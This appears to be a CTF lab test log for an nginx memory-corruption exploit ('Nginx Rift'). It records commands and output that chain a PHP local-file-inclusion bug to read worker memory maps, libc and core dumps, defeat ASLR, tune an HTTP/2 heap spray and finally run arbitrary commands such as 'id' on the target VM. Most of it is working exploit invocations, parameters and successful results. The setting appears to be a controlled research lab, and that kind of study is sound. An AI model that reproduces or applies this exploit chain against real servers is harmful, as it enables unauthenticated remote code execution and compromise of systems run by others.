# Nginx Rift CTF Tests

Last updated: 2026-05-15 05:32:17 CEST

## Baseline: Original PoC Command Execution

Purpose: prove the known-good PoC still performs command execution in the original lab, not just worker crashes.

Commands:

```bash
docker compose -f env/docker-compose.yml up -d --build --force-recreate
./poc.py --host 127.0.0.1 --port 19321 --cmd 'echo rift-default-ok > /tmp/rift_default_marker'
docker compose -f env/docker-compose.yml exec -T nginx sh -lc 'ls -l /tmp/rift_default_marker && cat /tmp/rift_default_marker'
```

Observed:

```text
[+] try 1/10 crashed - system("echo rift-default-ok > /tmp/rift_default_marker") executed
-rw-r--r-- 1 nobody nogroup ... /tmp/rift_default_marker
rift-default-ok
```

Status: pass.

## Same-Port LFI: PHP Process Identity

Purpose: confirm the PHP LFI primitive runs as the same non-root UID expected for nginx workers.

Command:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/self/status' | sed -n '1,12p'
```

Observed:

```text
Name: php-fpm8.1
Uid: 65534 65534 65534 65534
Gid: 65534 65534 65534 65534
```

Status: pass.

## Same-Port LFI: Worker Discovery

Purpose: discover nginx worker PID without Docker introspection.

Commands:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/app/tmp/nginx.pid'
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/7/task/7/children'
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/<candidate>/status'
```

Observed in current same-port run:

```text
/app/tmp/nginx.pid: 7
/proc/7/task/7/children: 9 14
nginx worker UID: 65534
```

Status: pass.

## Same-Port LFI: Nginx Worker Maps

Purpose: verify PHP LFI can read the target nginx worker memory map.

Command:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/<nginx-worker>/maps' | grep -E '/nginx$|libc\.so|\[heap\]'
```

Observed:

```text
555555554000-555555576000 r--p ... /nginx-src/build/nginx
555555659000-55555566f000 rw-p ... /nginx-src/build/nginx
7ffffefc0000-7ffffefe8000 r--p ... /usr/lib/x86_64-linux-gnu/libc.so.6
```

Status: pass.

## Remote-Only Driver: Map And Libc Derivation

Purpose: derive ASLR-sensitive target facts through HTTP-only primitives.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --tries-per-candidate 10 --verbose
```

Observed:

```text
Nginx worker PID discovered over LFI
Nginx writable image mapping: 0x555555659000
libc base/path from worker maps: 0x7ffffefc0000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() offset from LFI-read libc ELF: 0x50d70
system() absolute address: 0x7fffff010d70
URI-safe candidate cleanup addresses: 5 / 20
```

Result: no marker proof. Attempts caused worker disruption only.

Status: partial pass. Address derivation works; exploitation proof has not landed in same-port CTF mode.

## Next Test: Same-Port Core-Guided Mode

Purpose: evaluate whether an LFI-readable core dump can recover the actual sprayed payload address remotely.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --core-guided --tries-per-candidate 10 --verbose
```

Expected pass condition:

```text
[+] CTF win: marker /tmp/nginx_rift_ctf_<id> contains token ...
```

Observed:

```text
Core-guided URI-safe spray addresses: 2
Trying core-derived spray address 0x5555556b3477
Trying core-derived spray address 0x555555754a77
Core-guided candidates did not produce proof.
```

Status: failed proof, but passed core-read and spray-address-discovery subtests.

## Same-Port Core-Guided Mode With Post-Read Worker Reset

Purpose: determine whether same-port LFI core extraction perturbs the worker heap before the final exploit attempts.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --core-guided --tries-per-candidate 10 --verbose
```

Observed:

```text
Resetting nginx worker after LFI core read to restore a clean heap state
Trying core-derived spray address 0x5555556b3477
Trying core-derived spray address 0x555555754a77
Core-guided candidates did not produce proof.
```

Status: failed proof. Worker reset did not improve the result.

## Vagrant ESXi Launch

Purpose: create a real x86_64 Ubuntu lab VM on the `Ultra` ESXi host.

Commands:

```bash
vagrant validate
vagrant up --provider=vmware_esxi
```

Observed:

```text
root@ultra.home SSH key auth works.
ovftool still requires ESXi password auth for upload/import.
VMID: 24
VM IP: 192.168.1.205
Direct Vagrant-key SSH to vagrant@192.168.1.205 works.
```

Status: partial pass. VM creation succeeded; provider guest communication did not complete, so provisioning was completed by rsync plus direct SSH.

## Vagrant x86_64 Same-Port Smoke Test

Purpose: remove Docker Desktop amd64 emulation from the lab while preserving the x86_64 target architecture.

Commands:

```bash
vagrant up --provider=vmware_esxi
curl -sS http://192.168.1.205:19321/
curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/self/status' | sed -n '1,20p'
curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/sys/kernel/randomize_va_space'
```

Observed:

```text
HTTP /: ok
php-fpm8.1 UID/GID: 65534/65534
randomize_va_space: 2
uname -m: x86_64
nginx-rift/php8.1-fpm/nginx-rift-backend: active
```

Status: pass.

## Vagrant x86_64 Remote Driver Discovery

Purpose: confirm the HTTP-only driver can derive target facts on a real x86_64 Ubuntu VM with ASLR enabled.

Command:

```bash
./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --tries-per-candidate 1 --proof-delay 0.2 --verbose
```

Observed:

```text
Nginx worker PID discovered over LFI: 11975
Nginx writable image mapping: 0x55dd1b08e000
libc base/path from worker maps: 0x7fc69afa8000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() offset from LFI-read libc ELF: 0x50d70
system() absolute address: 0x7fc69aff8d70
URI-safe candidate cleanup addresses: 0 / 20
```

Status: pass for remote derivation, fail for legacy candidate availability in that ASLR layout.

## Vagrant x86_64 ASLR Candidate Sampling

Purpose: measure whether fresh nginx master ASLR layouts commonly produce URI-safe legacy cleanup candidates.

Method:

```text
For each sample:
1. restart nginx-rift as lab control,
2. run ctf_remote_exploit.py --derive-only --no-phpinfo,
3. record the nginx writable image mapping, libc base, heap ranges, and URI-safe candidate count.
```

Observed:

```text
sample=1  safe=0 rw=0x55c59b3ce000 libc=0x7f9652d66000
sample=2  safe=0 rw=0x55ab22265000 libc=0x7f7682d00000
sample=3  safe=0 rw=0x55e693dbc000 libc=0x7fb8a9d1d000
sample=4  safe=0 rw=0x555da1ccc000 libc=0x7fdb37b78000
sample=5  safe=0 rw=0x55a02cf5a000 libc=0x7f0f73ff6000
sample=6  safe=0 rw=0x5559cdd81000 libc=0x7fd4560a1000
sample=7  safe=0 rw=0x55cbe7f0e000 libc=0x7f54a9800000
sample=8  safe=0 rw=0x558fd8411000 libc=0x7f0e8d491000
sample=9  safe=0 rw=0x5559c6dfa000 libc=0x7f94c2e3b000
sample=10 safe=0 rw=0x56040dbbe000 libc=0x7f1e99cad000
sample=11 safe=0 rw=0x5558fcaae000 libc=0x7fcfedaaf000
sample=12 safe=0 rw=0x55e899590000 libc=0x7fc750ce4000
```

Status: pass. Empirical result so far is `0 / 12` fresh master layouts with any URI-safe legacy candidate.

## Vagrant x86_64 Core-Guided Mode

Purpose: test whether LFI-readable core dumps can recover usable sprayed fake-structure addresses on the real VM.

Setup fixes:

```text
kernel.core_pattern=core
kernel.core_uses_pid=0
fs.suid_dumpable=2
apport disabled
/app/tmp owned by nobody:nogroup
```

Command:

```bash
./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose
```

Observed:

```text
Nginx writable image mapping: 0x55d483d21000
libc base/path from worker maps: 0x7f0bb665f000 /usr/lib/x86_64-linux-gnu/libc.so.6
URI-safe candidate cleanup addresses: 0 / 20
No legacy URI-safe candidates; using safe bogus probe address 0x303030303030 to generate a core
Core-guided sprayed-body addresses: 0 URI-safe / 20 total
unsafe core hit: 0x55d484df7477
unsafe core hit: 0x55d484dfdeb7
...
```

Status: partial pass. The VM produces LFI-readable cores and the driver recovers sprayed fake-structure addresses, but this ASLR layout produced no URI-safe target address and therefore no CTF marker proof.

## Debug Twin: GDB Trace Geometry

Purpose: use the non-target clone VM to explain why partial-overwrite parameter sweeps stop short of the victim cleanup pointer.

Setup:

```text
debug/twin VM: 192.168.1.89:19321
target VM:     192.168.1.205:19321
gdb:           allowed only on the debug/twin
```

Trace script:

```bash
sudo gdb -q -p $(pgrep -n nginx) -x /vagrant/debug/gdb_trace_request.gdb -ex continue
```

Observed:

```text
COPY_CAPTURE prints the vulnerable copy destination and request pool.
CLEANUP_ADD prints the upload victim cleanup allocation.
POOL_DESTROY shows whether the corrupted pool cleanup pointer is reached.
Default geometry lands thousands of bytes before the cleanup slot.
connection_pool_size=1456 plus an 11-byte set-prefix reaches a 69-byte near miss.
One more padding step crosses an allocation threshold and loses the target geometry.
```

Status: pass for diagnosis, fail for exploit proof.

## Core Slot Scan

Purpose: recover many possible fake-cleanup structure addresses from the sprayed POST body, instead of only checking offset zero.

Command shape:

```bash
./ctf_remote_exploit.py \
  --host <vm-ip> --port 19321 \
  --core-guided --target-len <2|3|6> \
  --upload-victim --a-count 128 --plus-count 2800 \
  --verbose
```

Observed on the debug/twin:

```text
target-len=6: 0 URI-safe / thousands total
target-len=3: 0 URI-safe / thousands total
target-len=2: hundreds URI-safe / thousands total
```

Status: partial pass. Slot discovery works, but trying low-byte-safe slots without matching the victim cleanup pointer high bytes did not produce marker proof.

## Core Slot Cleanup-Window Filter

Purpose: avoid trying arbitrary low-2-byte-safe sprayed slots that cannot be reached by a partial overwrite of the victim cleanup pointer.

Command:

```bash
./ctf_remote_exploit.py \
  --host 192.168.1.89 --port 19321 \
  --core-guided --target-len 2 \
  --upload-victim --a-count 349 --plus-count 2600 \
  --tries-per-candidate 1 --max-core-hits 20 --verbose
```

Observed:

```text
Core slot candidates: 737 URI-safe / 9940 total
Cleanup-window filter: 4 plausible pools, 0 with probe low bytes, 125 matching safe slots
No cleanup pointer with probe low bytes was found.
First 20 filtered attempts: worker disruption, no marker proof.
```

Status: failed proof, useful negative signal. The core does not show evidence that the overwrite reached `pool->cleanup`.

## Delayed Victim Body

Purpose: test whether the overflow can corrupt victim request/pool metadata first, then let the later upload body register cleanup in the corrupted state.

Command:

```bash
./ctf_remote_exploit.py \
  --host 192.168.1.89 --port 19321 \
  --core-guided --target-len 2 \
  --upload-victim --delay-victim-body \
  --a-count 128 --plus-count 2800 \
  --tries-per-candidate 1 --max-core-hits 30 --verbose
```

Observed on tuned debug config:

```text
Core slot candidates: 940 URI-safe / 9940 total
Cleanup-window filter: 2 plausible pools, 0 with probe low bytes, 0 matching safe slots
gdb: SIGSEGV in ngx_http_request_handler() immediately after COPY_CAPTURE.
```

Status: failed proof. Delaying the body does not help while the overflow crashes the worker before cleanup allocation.

## HTTP/2 Connection-Pool CTF Win

Purpose: use a same-port HTTP/2 victim connection to provide a non-NULL connection-pool cleanup pointer and a binary-safe h2 body buffer in the same high-byte window.

Updated lab config:

```text
listen 19321 http2;
request_pool_size 4096;
connection_pool_size 1456;
set $original_endpoint PPPPPPPPPPP$1;
```

Command:

```bash
./ctf_remote_exploit.py \
  --host 192.168.1.205 --port 19321 \
  --core-guided --target-len 2 \
  --h2-victim --a-count 127 --plus-count 962 \
  --tries-per-candidate 1 --max-core-hits 100 \
  --proof-delay 0.25 --core-delay 2 --verbose
```

Observed on target VM:

```text
Nginx worker PID discovered over LFI: 15474
Nginx writable image mapping: 0x562f58677000
libc base/path from worker maps: 0x7fca6acfa000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() absolute address: 0x7fca6ad4ad70
Core slot candidates: 932 URI-safe / 10437 total
Cleanup-window filter: 12 plausible pools, 0 with probe low bytes, 1 corrupted/probe pools, 266 matching safe slots
corrupt-probe: pool=0x562f58b2d190 cleanup=0x562f58b23030
Trying core-derived slot address 0x562f58b23627 (body offset 80)
CTF win: marker /tmp/nginx_rift_ctf_36d102d7fd21 contains token
```

Status: pass. This is the first marker-verified target VM win with ASLR enabled and exploit-time inputs derived through HTTP/LFI.

Repeat after clean service restart:

```text
Nginx worker PID discovered over LFI: 15554
Nginx writable image mapping: 0x561281df2000
libc base/path from worker maps: 0x7f576434f000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() absolute address: 0x7f576439fd70
Core slot candidates: 896 URI-safe / 10437 total
Cleanup-window filter: 12 plausible pools, 0 with probe low bytes, 1 corrupted/probe pools, 45 matching safe slots
Trying core-derived slot address 0x5612824f777a (body offset 0)
CTF win: marker /tmp/nginx_rift_ctf_bc19ebe74839 contains token
```

## Demo Runner v1.1 Validation

Purpose: preserve the winning exploit while adding stronger demo-time diagnostics, structured artifacts, preflight checks, PID-correlated core freshness, and bounded geometry calibration.

Command:

```bash
./demo_ctf_exploit_v1_1.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --artifact-dir artifacts
```

Observed:

```text
randomize_va_space: 2
core_pattern: core
suid_dumpable: 2
config check passed: same-port HTTP/2 listener
nginx worker PID: 2394
system() address: 0x7ffb23260d70
core PID matches pre-probe worker PID 2394
fresh nonce found in core: 1010 URI-safe / 10437 slots
ranked matching slots: 166
using geometry A=127, plus=962
winning address: 0x5641c34f4627
winning body offset: 80
run artifact: artifacts/demo_v1_1_20260515-050301.json
```

Status: pass.

## Demo Runner v1.2 Strict Reset-Core Validation

Purpose: prove the final candidate list can be rebuilt from the controlled reset crash core immediately before final exploitation.

Command:

```bash
./demo_ctf_exploit_v1_2.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --require-reset-core \
  --artifact-dir artifacts
```

Observed:

```text
randomize_va_space: 2
os release: Ubuntu 22.04.3 LTS
nginx worker PID: 2473
system() address: 0x7ffac4597d70
core PID matches pre-probe worker PID 2473
pre-reset worker PID: 2474
reset core PID matches expected worker 2474
reset core nonce found: 1204 URI-safe / 10437 slots
reset ranked matching slots: 155
using 155 candidates from the fresh reset core
winning address: 0x56389b17277a
winning body offset: 0
run artifact: artifacts/demo_v1_2_20260515-050555.json
```

Status: pass. This is the preferred technical demo runner.

## Demo Runner v1.3 Strict Freshness And Layout Validation

Purpose: verify re-derived pre-probe worker facts, strict core PID matching, and pre-reset/final layout stability checks.

Command:

```bash
./demo_ctf_exploit_v1_3.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --require-reset-core \
  --artifact-dir artifacts
```

Observed:

```text
randomize_va_space: 2
initial worker PID: 2602
reset core PID matches expected worker 2604
reset core nonce found: 928 URI-safe / 10437 slots
pre-reset to final worker: nginx writable map stable
pre-reset to final worker: libc base stable
pre-reset to final worker: system address stable
winning address: 0x557f3875677a
winning body offset: 0
run artifact: artifacts/demo_v1_3_20260515-051328.json
```

Status: pass.

## Demo Runner v1.4 Strict Preflight And Candidate Filter

Purpose: fail fast on wrong lab/core settings and filter impossible final candidates before exploit attempts.

Command:

```bash
./demo_ctf_exploit_v1_4.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --require-reset-core \
  --artifact-dir artifacts
```

Observed:

```text
strict preflight: enabled
initial worker PID: 2680
reset core PID matches expected worker 2681
reset core nonce found: 896 URI-safe / 10437 slots
final payload size: 105
candidate sanity kept: 45
candidate sanity dropped: 0
winning address: 0x55b9f862777a
winning body offset: 0
run artifact: artifacts/demo_v1_4_20260515-051517.json
```

Status: pass.

## Demo Runner v1.5 Round Campaign Mode

Purpose: add bounded retry rounds with fresh nonce/core state if an exploit round is exhausted.

Command:

```bash
./demo_ctf_exploit_v1_5.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --require-reset-core \
  --rounds 2 --artifact-dir artifacts
```

Observed:

```text
exploit rounds: 2
round 1 reset core PID matches expected worker 2759
round 1 reset core nonce found: 928 URI-safe / 10437 slots
candidate sanity kept: 166
candidate sanity dropped: 0
winning address: 0x557c5768677a
winning body offset: 0
run artifact: artifacts/demo_v1_5_20260515-051730.json
```

Status: pass. The first round won, so round 2 was not needed.

## Demo Runner v1.6 Negative Path

Purpose: prove expected-failure handling records a clean negative pass when a deliberately bad final candidate is sent.

Command:

```bash
./demo_ctf_exploit_v1_6.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --require-reset-core \
  --negative-test bad-candidate --negative-test-only --expected-fail \
  --no-binary-fingerprint --artifact-dir artifacts
```

Observed:

```text
reset core PID matches expected worker 2850
reset core nonce found: 1010 URI-safe / 10437 slots
candidate sanity kept: 160
candidate sanity dropped: 6
negative candidate produced no marker proof
run artifact: artifacts/demo_v1_6_20260515-053017.json
```

Status: pass, recorded as `negative_pass`.

## Demo Runner v1.6 Command Execution And Fingerprinting

Purpose: run an arbitrary command through the hardened proof-command builder, capture output, fingerprint remote binaries, and verify delayed cleanup.

Command:

```bash
./demo_ctf_exploit_v1_6.py \
  --host 192.168.1.205 --port 19321 \
  --fast --no-color --require-reset-core --rounds 2 \
  --exec-cmd id --cleanup-delay 30 --cleanup-core \
  --artifact-dir artifacts
```

Observed:

```text
nginx sha256: 14bebe8937678598...
nginx build-id: 060e053ab1fa1a2876b7fe0ff4eff0cc777857b6
libc sha256: c53819710b163d3f...
libc build-id: 095c7ba148aeca81668091f718047078d57efddb
reset core PID matches expected worker 2913
reset core nonce found: 1028 URI-safe / 10437 slots
candidate sanity kept: 195
candidate sanity dropped: 29
winning address: 0x55a491955627
winning body offset: 80
command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
run artifact: artifacts/demo_v1_6_20260515-053037.json
```

Cleanup check after the configured delay:

```text
marker=/tmp/nginx_rift_demo_v1_6_246468e701a7 http=404
core http=404
```

Status: pass.

## Demo Artifact Summarizer

Purpose: summarize multiple demo artifacts and surface success/negative-pass status, reset-core PID matches, candidate counts, winning addresses, and command modes.

Command:

```bash
./summarize_demo_artifacts.py \
  artifacts/demo_v1_6_20260515-053017.json \
  artifacts/demo_v1_6_20260515-053037.json
```

Observed:

```text
artifacts=2 success=1 negative_pass=1 failed_or_other=0
```

Status: pass.
